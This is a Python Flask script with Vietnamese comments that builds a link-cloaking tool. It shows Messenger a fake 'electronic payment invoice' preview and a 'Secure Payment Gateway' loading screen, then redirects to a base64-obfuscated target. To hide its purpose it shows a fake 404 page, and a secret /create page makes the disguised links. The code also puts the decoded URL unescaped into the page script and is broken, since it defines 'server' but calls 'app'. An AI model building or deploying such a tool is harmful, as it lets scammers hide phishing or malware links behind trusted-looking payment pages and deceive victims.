import base64
import os
from flask import Flask, request, render_template_string, redirect

server = Flask(__name__)

# --- CẤU HÌNH GIAO DIỆN MESSENGER ---
META_CONFIG = {
    "title": "Hóa đơn thanh toán điện tử",
    "desc": "Vui lòng hoàn tất đơn hàng. Giao dịch được bảo mật.",
    "image": "https://cdn-icons-png.flaticon.com/512/10103/10103287.png" # Ảnh cái khiên bảo mật
}

# 1. Trang chính (Xử lý chuyển hướng)
@app.route('/')
def home():
    # Lấy mã ID từ đường dẫn (ví dụ: ?id=Mã_Base64)
    encoded_url = request.args.get('id')
    
    # Nếu không có ID -> Giả vờ là trang lỗi 404 (Để người lạ vào không biết web này làm gì)
    if not encoded_url:
        return "<h1>404 - Page Not Found</h1>", 404

    try:
        # Giải mã Base64 ra link gốc
        target_url = base64.b64decode(encoded_url).decode('utf-8')
    except:
        return "<h1>Invalid Link</h1>", 400

    # Giao diện chờ "fake" (Giống code trước nhưng dynamic link)
    html_content = f"""
    <!DOCTYPE html>
    <html lang="vi">
    <head>
        <meta charset="UTF-8">
        <title>{META_CONFIG['title']}</title>
        
        <meta property="og:title" content="{META_CONFIG['title']}" />
        <meta property="og:description" content="{META_CONFIG['desc']}" />
        <meta property="og:image" content="{META_CONFIG['image']}" />
        <meta property="og:type" content="website" />
        
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            body {{
                font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
                background-color: #f0f2f5;
                display: flex;
                flex-direction: column;
                justify-content: center;
                align-items: center;
                height: 100vh;
                margin: 0;
                text-align: center;
            }}
            .loader {{
                border: 4px solid #f3f3f3;
                border-top: 4px solid #0084ff;
                border-radius: 50%;
                width: 50px;
                height: 50px;
                animation: spin 1s linear infinite;
                margin-bottom: 20px;
            }}
            @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
            .text {{ color: #65676b; font-size: 16px; font-weight: 500; }}
        </style>
        
        <script>
            // Chuyển hướng đến link đã giải mã
            setTimeout(function() {{
                window.location.href = "{target_url}";
            }}, 1500);
        </script>
    </head>
    <body>
        <div class="loader"></div>
        <div class="text">Đang xác thực giao dịch...</div>
        <div class="text" style="font-size: 12px; margin-top: 10px; opacity: 0.7">Secure Payment Gateway</div>
    </body>
    </html>
    """
    return render_template_string(html_content)

# 2. Trang tạo link (Chỉ mình ní biết để vào tạo link)
@app.route('/create', methods=['GET', 'POST'])
def create_link():
    generated_link = ""
    if request.method == 'POST':
        original_url = request.form.get('url')
        if original_url:
            # Mã hóa link sang Base64
            encoded = base64.b64encode(original_url.encode('utf-8')).decode('utf-8')
            # Tạo link đầy đủ
            host_url = request.host_url.rstrip('/') # Lấy domain hiện tại
            generated_link = f"{host_url}/?id={encoded}"

    # Giao diện đơn giản để nhập link
    return f"""
    <div style="font-family: sans-serif; padding: 50px; text-align: center;">
        <h2>Tool Bọc Link Pro</h2>
        <form method="POST">
            <input type="text" name="url" placeholder="Dán link gốc vào đây (https://...)" style="width: 300px; padding: 10px;" required>
            <br><br>
            <button type="submit" style="padding: 10px 20px; background: #0084ff; color: white; border: none; cursor: pointer;">Tạo Link Bọc</button>
        </form>
        <br>
        {f'<div style="background: #e9ecef; padding: 15px; word-break: break-all;"><b>Link của bạn:</b><br><a href="{generated_link}">{generated_link}</a></div>' if generated_link else ''}
    </div>
    """

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=5000)
